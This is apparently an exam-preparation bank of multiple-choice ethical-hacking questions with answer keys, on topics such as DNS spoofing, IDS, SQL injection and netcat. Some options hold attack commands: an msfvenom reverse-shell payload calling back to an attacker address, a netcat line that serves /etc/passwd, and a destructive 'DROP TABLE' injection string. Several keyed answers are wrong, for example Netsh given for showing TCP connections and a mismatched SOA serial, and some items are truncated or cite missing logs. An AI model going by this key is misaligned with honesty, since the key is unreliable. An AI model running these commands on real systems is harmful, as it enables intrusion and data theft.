"Let's imagine three companies (A, B and C), all competing in a challenging global environment. Company A and B are working together in developing a product that will generate a major competitive advantage for them. Company A has a secure DNS server while company B has a DNS server vulnerable to spoofing. With a spoofing attack on the DNS server of company B, company C gains access to outgoing e-mails from company B. How do you prevent DNS spoofing?\nA. Install DNS logger and track vulnerable packets\nB. Disable DNS timeouts\nC. Install DNS Anti-spoofing\nD. Disable DNS Zone Transfer\n","Answer: C — C. Install DNS Anti-spoofing"
"Abel, a cloud architect, uses container technology to deploy applications/software including all its dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. For the containerization of applications, he follows the five-tier container technology architecture. Currently. Abel is verifying and validating image contents, signing images, and sending them to the registries. Which of the following tiers of the container technology architecture Is Abel currently working in?\nA. Tier-1: Developer machines\nB. Tier-4: Orchestrators\nC. Tier-3: Registries\nD. Tier-2: Testing and accreditation systems\n","Answer: D — D. Tier-2: Testing and accreditation systems"
"Henry Is a cyber security specialist hired by BlackEye - Cyber security solutions. He was tasked with discovering the operating system (OS) of a host. He used the Unkornscan tool to discover the OS of the target system. As a result, he obtained a TTL value, which Indicates that the target system is running a Windows OS. Identify the TTL value Henry obtained, which indicates that the target OS is Windows.\nA. 64\nB. 128\nC. 255\nD. 138\n","Answer: B — B. 128"
"When a security analyst prepares for the formal security assessment - what of the following should be done in order to determine inconsistencies in the secure assets database and verify that system is compliant to the minimum security baseline?\nA. Data items and vulnerability scanning\nB. Interviewing employees and network engineers\nC. Reviewing the firewalls configuration\nD. Source code review\n","Answer: A — A. Data items and vulnerability scanning"
"which type of virus can change its own code and then cipher itself multiple times as it replicates?\nA. Stealth virus\nB. Tunneling virus\nC. Cavity virus\nD. Encryption virus\n","Answer: A — A. Stealth virus"
"Which of the following statements is FALSE with respect to Intrusion Detection Systems?\nA. Intrusion Detection Systems can be configured to distinguish specific content in network packets\nB. Intrusion Detection Systems can easily distinguish a malicious payload in an encrypted traffic\nC. Intrusion Detection Systems require constant update of the signature library\nD. Intrusion Detection Systems can examine the contents of the data n context of the network protocol\n","Answer: B — B. Intrusion Detection Systems can easily distinguish a malicious payload in an encrypted traffic"
"Which of the following DoS tools is used to attack target web applications by starvation of available sessions on the web server? The tool keeps sessions at halt using never-ending POST transmissions and sending an arbitrarily large content-length header value.\nA. My Doom\nB. Astacheldraht\nC. R-U-Dead-Yet?(RUDY)\nD. LOIC\n","Answer: C — C. R-U-Dead-Yet?(RUDY)"
"Morris, a professional hacker, performed a vulnerability scan on a target organization by sniffing the traffic on the network lo identify the active systems, network services, applications, and vulnerabilities. He also obtained the list of the users who are currently accessing the network. What is the type of vulnerability assessment that Morris performed on the target organization?\nA. internal assessment\nB. Passive assessment\nC. External assessment\nD. Credentialed assessment\n","Answer: B — B. Passive assessment"
"Attacker Steve targeted an organization's network with the aim of redirecting the company's web traffic to another malicious website. To achieve this goal, Steve performed DNS cache poisoning by exploiting the vulnerabilities In the DNS server software and modified the original IP address of the target website to that of a fake website. What is the technique employed by Steve to gather information for identity theft?\nA. Pretexting\nB. Pharming\nC. Wardriving\nD. Skimming\n","Answer: B — B. Pharming"
"Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the Integrity of updating and changing data. For this purpose, he uses a web service that uses HTTP methods such as PUT. POST. GET. and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application. What is the type of web-service API mentioned in the above scenario?\nA. JSON-RPC\nB. SOAP API\nC. RESTful API\nD. REST API\n","Answer: C — C. RESTful API"
"This form of encryption algorithm is asymmetric key block cipher that is characterized by a 128-bit block size, and its key size can be up to 256 bits. Which among the following is this encryption algorithm?\nA. Twofish encryption algorithm\nB. HMAC encryption algorithm\nC. IDEA\nD. Blowfish encryption algorithm\n","Answer: A — A. Twofish encryption algorithm"
"Which command can be used to show the current TCP/IP connections?\nA. Netsh\nB. Netstat\nC. Net use connection\nD. Net use\n","Answer: A — A. Netsh"
"Tremp is an IT Security Manager, and he is planning to deploy an IDS in his small company. He is looking for an IDS with the following characteristics: - Verifies success or failure of an attack - Monitors system activities Detects attacks that a network-based IDS fails to detect - Near real-time detection and response - Does not require additional hardware - Lower entry cost Which type of IDS is best suited for Tremp's requirements?\nA. Gateway-based IDS\nB. Network-based IDS\nC. Host-based IDS\nD. Open source-based\n","Answer: C — C. Host-based IDS"
"Which of the following are well known password-cracking programs?\nA. L0phtcrack\nB. NetCat\nC. Jack the Ripper\nD. Netbus\nE. John the Ripper\n","Answer: AE — A. L0phtcrack; E. John the Ripper"
"What is the algorithm used by LM for Windows2000 SAM?\nA. MD4\nB. DES\nC. SHA\nD. SSL\n","Answer: B — B. DES"
"In Trojan terminology, what is a covert channel?\nA. A channel that transfers information within a computer system or network in a way that violates the security policy\nB. A legitimate communication path within a computer system or network for transfer of data\nC. It is a kernel operation that hides boot processes and services to mask detection\nD. It is Reverse tunneling technique that uses HTTPS protocol instead of HTTP protocol to establish connections\n","Answer: A — A. A channel that transfers information within a computer system or network in a way that violates the security policy"
"Emily, an extrovert obsessed with social media, posts a large amount of private information, photographs, and location tags of recently visited places. Realizing this. James, a professional hacker, targets Emily and her acquaintances, conducts a location search to detect their geolocation by using an automated tool, and gathers information to perform other sophisticated attacks. What is the tool employed by James in the above scenario?\nA. ophcrack\nB. Hootsuite\nC. VisualRoute\nD. HULK\n","Answer: B — B. Hootsuite"
"s) for his company for over 15 years and has become very successful. One day, Yancey comes in to work and finds out that the company will be downsizing and he will be out of a job in two weeks. Yancey is very angry and decides to place logic bombs, viruses, Trojans, and backdoors all over the network to take down the company once he has left. Yancey does not care if his actions land him in jail for 30 or more years, he just wants the company to pay for what they are doing to him. What would Yancey be considered?\nA. Yancey would be considered a Suicide Hacker\nB. Since he does not care about going to jail, he would be considered a Black Hat\nC. Because Yancey works for the company currently; he would be a White Hat\nD. Yancey is a Hacktivist Hacker since he is standing up to a company that is downsizing\n","Answer: A — A. Yancey would be considered a Suicide Hacker"
"What piece of hardware on a computer's motherboard generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is not possible?\nA. CPU\nB. GPU\nC. UEFI\nD. TPM\n","Answer: D — D. TPM"
"An attacker redirects the victim to malicious websites by sending them a malicious link by email. The link appears authentic but redirects the victim to a malicious web page, which allows the attacker to steal the victim's data. What type of attack is this?\nA. Phishing\nB. Vlishing\nC. Spoofing\nD. DDoS\n","Answer: A — A. Phishing"
"Abel, a security professional, conducts penetration testing in his client organization to check for any security loopholes. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. This led to a Dos attack, and as a result, legitimate employees were unable to access the clients network. Which of the following attacks did Abel perform in the above scenario?\nA. VLAN hopping\nB. DHCP starvation\nC. Rogue DHCP server attack\nD. STP attack\n","Answer: B — B. DHCP starvation"
"what is the port to block first in case you are suspicious that an loT device has been compromised?\nA. 22\nB. 443\nC. 48101\nD. 80\n","Answer: C — C. 48101"
"While browsing his Facebook teed, Matt sees a picture one of his friends posted with the caption. ""Learn more about your friends!"", as well as a number of personal questions. Matt is suspicious and texts his friend, who confirms that he did indeed post it. With assurance that the post is legitimate. Matt responds to the questions on the post, a few days later. Mates bank account has been accessed, and the password has been changed. What most likely happened?\nA. Matt inadvertently provided the answers to his security questions when responding to the post.\nB. Matt's bank-account login information was brute forced.\nC. Matt Inadvertently provided his password when responding to the post.\nD. Matt's computer was infected with a keylogger.\n","Answer: A — A. Matt inadvertently provided the answers to his security questions when responding to the post."
"Techno Security Inc. recently hired John as a penetration tester. He was tasked with identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered. John decided to perform a TCP SYN ping scan on the target network. Which of the following Nmap commands must John use to perform the TCP SYN ping scan?\nA. nmap -sn -pp < target ip address >\nB. nmap -sn -PO < target IP address >\nC. nmap -sn -PS < target IP address >\nD. nmap -sn -PA < target IP address >\n","Answer: C — C. nmap -sn -PS < target IP address >"
"While testing a web application in development, you notice that the web server does not properly ignore the ??dot dot slash?? (../) character string and instead returns the file listing of a folder structure of the server. What kind of attack is possible in this scenario?\nA. Cross-site scripting\nB. Denial of service\nC. SQL injection\nD. Directory traversal\n","Answer: D — D. Directory traversal"
"While examining audit logs, you discover that people are able to telnet into the SMTP server on port 25. You would like to block this, though you do not see any evidence of an attack or other wrong doing. However, you are concerned about affecting the normal functionality of the email server. From the following options choose how best you can achieve this objective?\nA. Block port 25 at the firewall.\nB. Shut off the SMTP service on the server.\nC. Force all connections to use a username and password.\nD. Switch from Windows Exchange to UNIX Sendmail.\nE. None of the above.\n","Answer: E — E. None of the above."
"Password cracking programs reverse the hashing process to recover passwords. (True/False.)\nA. True\nB. False\n","Answer: B — B. False"
"s) or you may contact us at the following address: Media Internet Consultants, Edif. Neptuno, Planta Baja, Ave. Ricardo J. Alfaro, Tumba Muerto, n/a Panama How will you determine if this is Real Anti-Virus or Fake Anti-Virus website?\nA. Look at the website design, if it looks professional then it is a Real Anti-Virus website\nB. Connect to the site using SSL, if you are successful then the website is genuine\nC. Search using the URL and Anti-Virus product name into Google and lookout for suspicious warnings against this site\nD. Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware\nE. Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware\n","Answer: C — C. Search using the URL and Anti-Virus product name into Google and lookout for suspicious warnings against this site"
"During the enumeration phase. Lawrence performs banner grabbing to obtain information such as OS details and versions of services running. The service that he enumerated runs directly on TCP port 445. Which of the following services is enumerated by Lawrence in this scenario?\nA. Server Message Block (SMB)\nB. Network File System (NFS)\nC. Remote procedure call (RPC)\nD. Telnet\n","Answer: A — A. Server Message Block (SMB)"
"Ethical backer jane Doe is attempting to crack the password of the head of the it department of ABC company. She Is utilizing a rainbow table and notices upon entering a password that extra characters are added to the password after submitting. What countermeasure is the company using to protect against rainbow tables?\nA. Password key hashing\nB. Password salting\nC. Password hashing\nD. Account lockout\n","Answer: B — B. Password salting"
"An attacker runs netcat tool to transfer a secret file between two hosts. He is worried about information being sniffed on the network. How would the attacker use netcat to encrypt the information before transmitting onto the wire?\nA. Machine A: netcat -l -p -s password 1234 < testfileMachine B: netcat <machine A IP> 1234\nB. Machine A: netcat -l -e magickey -p 1234 < testfileMachine B: netcat <machine A IP> 1234\nC. Machine A: netcat -l -p 1234 < testfile -pw passwordMachine B: netcat <machine A IP> 1234 -pw password\nD. Use cryptcat instead of netcat\n","Answer: D — D. Use cryptcat instead of netcat"
"what is the correct way of using MSFvenom to generate a reverse TCP shellcode for windows?\nA. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f c\nB. msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f c\nC. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe\nD. msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe\n","Answer: C — C. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe"
"jane invites her friends Alice and John over for a LAN party. Alice and John access Jane's wireless network without a password. However. Jane has a long, complex password on her router. What attack has likely occurred?\nA. Wireless sniffing\nB. Piggybacking\nC. Evil twin\nD. Wardriving\n","Answer: C — C. Evil twin"
"Fred is the network administrator for his company. Fred is testing an internal switch. From an external IP address, Fred wants to try and trick this switch into thinking it already has established a session with his computer. How can Fred accomplish this?\nA. Fred can accomplish this by sending an IP packet with the RST/SIN bit and the source address of his computer.\nB. He can send an IP packet with the SYN bit and the source address of his computer.\nC. Fred can send an IP packet with the ACK bit set to zero and the source address of the switch.\nD. Fred can send an IP packet to the switch with the ACK bit and the source address of his machine.\n","Answer: D — D. Fred can send an IP packet to the switch with the ACK bit and the source address of his machine."
"Taylor, a security professional, uses a tool to monitor her company's website, analyze the website's traffic, and track the geographical location of the users visiting the company's website. Which of the following tools did Taylor employ in the above scenario?\nA. WebSite Watcher\nB. web-Stat\nC. Webroot\nD. WAFW00F\n","Answer: B — B. web-Stat"
"An Internet Service Provider (ISP) has a need to authenticate users connecting via analog modems, Digital Subscriber Lines (DSL), wireless data services, and Virtual Private Networks (VPN) over a Frame Relay network. Which AAA protocol is the most likely able to handle this requirement?\nA. TACACS+\nB. DIAMETER\nC. Kerberos\nD. RADIUS\n","Answer: D — D. RADIUS"
"In your cybersecurity class, you are learning about common security risks associated with web servers. One topic that comes up is the risk posed by using default server settings. Why is using default settings ona web - server considered a security risk, and what would be the best initial step to mitigate this risk?\nA. Default settings cause server malfunctions; simplify the settings\nB. Default settings allow unlimited login attempts; setup account lockout\nC. Default settings reveal server software type; change these settings\nD. Default settings enable auto-updates; disable and manually patch\n","Answer: C — C. Default settings reveal server software type; change these settings"
"Attempting an injection attack on a web server based on responses to True/False QUESTION NO:s is called which of the following?\nA. Compound SQLi\nB. Blind SQLi\nC. Classic SQLi\nD. DMS-specific SQLi\n","Answer: B — B. Blind SQLi"
"You're the security manager for a tech company that uses a database to store sensitive customer data. You have implemented countermeasures against SQL injection attacks. Recently, you noticed some suspicious activities and suspect an attacker is using SQL injection techniques. The attacker is believed to use different forms of payloads in his SQL queries. In the case of a successful SQL injection attack, which of the following payloads would have the most significant impact?\nA. ??OR 'T=""1: This payload manipulates the WHERE clause of an SQL statement, allowing the attacker to view unauthorized data\nB. ??OR username LIKE '%: This payload uses the LIKE operator to search for a specific pattern in a column\nC. OR ??a??='a; DROP TABLE members; --: This payload combines the manipulation of the WHERE clausewith a destructive action, causing data loss\nD. UNION SELECT NULL, NULL, NULL -- : This payload manipulates the UNION SQL operator, enabling the attacker to retrieve data from different database tables\n","Answer: C — C. OR ??a??='a; DROP TABLE members; --: This payload combines the manipulation of the WHERE clausewith a destructive action, causing data loss"
"What is the least important information when you analyze a public IP address in a security alert?\nA. DNS\nB. Whois\nC. Geolocation\nD. ARP\n","Answer: D — D. ARP"
"What useful information is gathered during a successful Simple Mail Transfer Protocol (SMTP) enumeration?\nA. The two internal commands VRFY and EXPN provide a confirmation of valid users, email addresses, aliases, and mailing lists.\nB. Reveals the daily outgoing message limits before mailboxes are locked\nC. The internal command RCPT provides a list of ports open to message traffic.\nD. A list of all mail proxy server addresses used by the targeted host\n","Answer: A — A. The two internal commands VRFY and EXPN provide a confirmation of valid users, email addresses, aliases, and mailing lists."
"Study the following log extract and identify the attack.\nA. Hexcode Attack\nB. Cross Site Scripting\nC. Multiple Domain Traversal Attack\nD. Unicode Directory Traversal Attack\n","Answer: D — D. Unicode Directory Traversal Attack"
"You are analysing traffic on the network with Wireshark. You want to routinely run a cron job which will run the capture against a specific set of IPs - 192.168.8.0/24. What command you would use?\nA. wireshark --fetch ''192.168.8*''\nB. wireshark --capture --local masked 192.168.8.0 ---range 24\nC. tshark -net 192.255.255.255 mask 192.168.8.0\nD. sudo tshark -f''net 192 .68.8.0/24''\n","Answer: D — D. sudo tshark -f''net 192 .68.8.0/24''"
"What does the following command in netcat do? nc -l -u -p55555 < /etc/passwd\nA. logs the incoming connections to /etc/passwd file\nB. loads the /etc/passwd file to the UDP port 55555\nC. grabs the /etc/passwd file when connected to UDP port 55555\nD. deletes the /etc/passwd file when connected to the UDP port 55555\n","Answer: C — C. grabs the /etc/passwd file when connected to UDP port 55555"
"You are programming a buffer overflow exploit and you want to create a NOP sled of 200 bytes in the program exploit.c What is the hexadecimal value of NOP instruction?\nA. 0x60\nB. 0x80\nC. 0x70\nD. 0x90\n","Answer: D — D. 0x90"
"Which of the following is the structure designed to verify and authenticate the identity of individuals within the enterprise taking part in a data exchange?\nA. SOA\nB. biometrics\nC. single sign on\nD. PKI\n","Answer: D — D. PKI"
"What two conditions must a digital signature meet?\nA. Has to be the same number of characters as a physical signature and must be unique.\nB. Has to be unforgeable, and has to be authentic.\nC. Must be unique and have special characters.\nD. Has to be legible and neat.\n","Answer: B — B. Has to be unforgeable, and has to be authentic."
"Which of the following tools can be used to perform a zone transfer?\nA. NSLookup\nB. Finger\nC. Dig\nD. Sam Spade\nE. Host\nF. Netcat\nG. Neotrace\n","Answer: ACDE — A. NSLookup; C. Dig; D. Sam Spade; E. Host"
"One of your team members has asked you to analyze the following SOA record. What is the version? Rutgers.edu.SOA NS1.Rutgers.edu ipad.college.edu (200302028 3600 3600 604800 2400.) (Choose four.)\nA. 200303028\nB. 3600\nC. 604800\nD. 2400\nE. 60\nF. 4800\n","Answer: A — A. 200303028"
"When discussing passwords, what is considered a brute force attack?\nA. You attempt every single possibility until you exhaust all possible combinations or discover the password\nB. You threaten to use the rubber hose on someone unless they reveal their password\nC. You load a dictionary of words into your cracking program\nD. You create hashes of a large number of words and compare it with the encrypted passwords\nE. You wait until the password expires\n","Answer: A — A. You attempt every single possibility until you exhaust all possible combinations or discover the password"
"You are working as a Security Analyst in a company XYZ that owns the whole subnet range of 23.0.0.0/8 and 192.168.0.0/8. While monitoring the data, you find a high number of outbound connections. You see that IP’s owned by XYZ (Internal) and private IP’s are communicating to a Single Public IP. Therefore, the Internal IP’s are sending data to the Public IP. After further analysis, you find out that this Public IP is a blacklisted IP, and the internal communicating devices are compromised. What kind of attack does the above scenario depict?\nA. Botnet Attack\nB. Spear Phishing Attack\nC. Advanced Persistent Threats\nD. Rootkit Attack\n","Answer: A — A. Botnet Attack"
"Joseph was the Web site administrator for the Mason Insurance in New York, who's main Web site was located at www.masonins.com. Joseph uses his laptop computer regularly to administer the Web site. One night, Joseph received an urgent phone call from his friend, Smith. According to Smith, the main Mason Insurance web site had been vandalized! All of its normal content was removed and replaced with an attacker's message ''Hacker Message: You are dead! Freaks!” From his office, which was directly connected to Mason Insurance's internal network, Joseph surfed to the Web site using his laptop. In his browser, the Web site looked completely intact. No changes were apparent. Joseph called a friend of his at his home to help troubleshoot the problem. The Web site appeared defaced when his friend visited using his DSL connection. So, while Smith and his friend could see the defaced page, Joseph saw the intact Mason Insurance web site. To help make sense of this problem, Joseph decided to access the Web site using hisdial-up ISP. He disconnected his laptop from the corporate internal network and used his modem to dial up the same ISP used by Smith. After his modem connected, he quickly typed www.masonins.com in his browser to reveal the following web page: After seeing the defaced Web site, he disconnected his dial-up line, reconnected to the internal network, and used Secure Shell (SSH) to log in directly to the Web server. He ran Tripwire against the entire Web site, and determined that every system file and all the Web content on the server were intact. How did the attacker accomplish this hack?\nA. ARP spoofing\nB. SQL injection\nC. DNS poisoning\nD. Routing table injection\n","Answer: C — C. DNS poisoning"
"Which of the following algorithms can be used to guarantee the integrity of messages being sent, in transit, or stored?\nA. symmetric algorithms\nB. asymmetric algorithms\nC. hashing algorithms\nD. integrity algorithms\n","Answer: C — C. hashing algorithms"
"In the field of cryptanalysis, what is meant by a “rubber-hose” attack?\nA. Forcing the targeted keystream through a hardware-accelerated device such as an ASIC.\nB. A backdoor placed into a cryptographic algorithm by its creator.\nC. Extraction of cryptographic secrets through coercion or torture.\nD. Attempting to decrypt ciphertext by making logical assumptions about the contents of the original plaintext.\n","Answer: C — C. Extraction of cryptographic secrets through coercion or torture."
"In an internal security audit, the white hat hacker gains control over a user account and attempts to acquire access to another account's confidential files and information. How can he achieve this?\nA. Privilege Escalation\nB. Shoulder-Surfing\nC. Hacking Active Directory\nD. Port Scanning\n","Answer: A — A. Privilege Escalation"
"Which DNS resource record can indicate how long any ""DNS poisoning"" could last?\nA. MX\nB. SOA\nC. NS\nD. TIMEOUT\n","Answer: B — B. SOA"
"Based on the following extract from the log of a compromised machine, what is the hacker really trying to steal?\nA. har.txt\nB. SAM file\nC. wwwroot\nD. Repair file\n","Answer: B — B. SAM file"
"You are tasked to configure the DHCP server to lease the last 100 usable IP addresses in subnet to. 1.4.0/23. Which of the following IP addresses could be teased as a result of the new configuration?\nA. 210.1.55.200\nB. 10.1.4.254\nC. 10..1.5.200\nD. 10.1.4.156\n","Answer: C — C. 10..1.5.200"
"Log monitoring tools performing behavioral analysis have alerted several suspicious logins on a Linux server occurring during non-business hours. After further examination of all login activities, it is noticed that none of the logins have occurred during typical work hours. A Linux administrator who is investigating this problem realizes the system time on the Linux server is wrong by more than twelve hours. What protocol used on Linux servers to synchronize the time has stopped working?\nA. Time Keeper\nB. NTP\nC. PPP\nD. OSPP\n","Answer: B — B. NTP"
"Elliot is in the process of exploiting a web application that uses SQL as a back-end database. He’s determined that the application is vulnerable to SQL injection, and has introduced conditional timing delays into injected queries to determine whether they are successful. What type of SQL injection is Elliot most likely performing?\nA. Error-based SQL injection\nB. Blind SQL injection\nC. Union-based SQL injection\nD. NoSQL injection\n","Answer: B — B. Blind SQL injection"
"When a normal TCP connection starts, a destination host receives a SYN (synchronize/start) packet from a source host and sends back a SYN/ACK (synchronize acknowledge). The destination host must then hear an ACK (acknowledge) of the SYN/ACK before the connection is established. This is referred to as the ""TCP three-way handshake."" While waiting for the ACK to the SYN ACK, a connection queue of finite size on the destination host keeps track of connections waiting to be completed. This queue typically empties quickly since the ACK is expected to arrive a few milliseconds after the SYN ACK. How would an attacker exploit this design by launching TCP SYN attack?\nA. Attacker generates TCP SYN packets with random destination addresses towards a victim host\nB. Attacker floods TCP SYN packets with random source addresses towards a victim host\nC. Attacker generates TCP ACK packets with random source addresses towards a victim host\nD. Attacker generates TCP RST packets with random source addresses towards a victim host\n","Answer: B — B. Attacker floods TCP SYN packets with random source addresses towards a victim host"
"Under what conditions does a secondary name server request a zone transfer from a primary name server?\nA. When a primary SOA is higher that a secondary SOA\nB. When a secondary SOA is higher that a primary SOA\nC. When a primary name server has had its service restarted\nD. When a secondary name server has had its service restarted\nE. When the TTL falls to zero\n","Answer: A — A. When a primary SOA is higher that a secondary SOA"
"What tool can crack Windows SMB passwords simply by listening to network traffic?\nA. This is not possible\nB. Netbus\nC. NTFSDOS\nD. L0phtcrack\n","Answer: D — D. L0phtcrack"
"One of your team members has asked you to analyze the following SOA record. What is the TTL? Rutgers.edu.SOA NS1.Rutgers.edu ipad.college.edu (200302028 3600 3600 604800 2400.)\nA. 200303028\nB. 3600\nC. 604800\nD. 2400\nE. 60\nF. 4800\n","Answer: D — D. 2400"
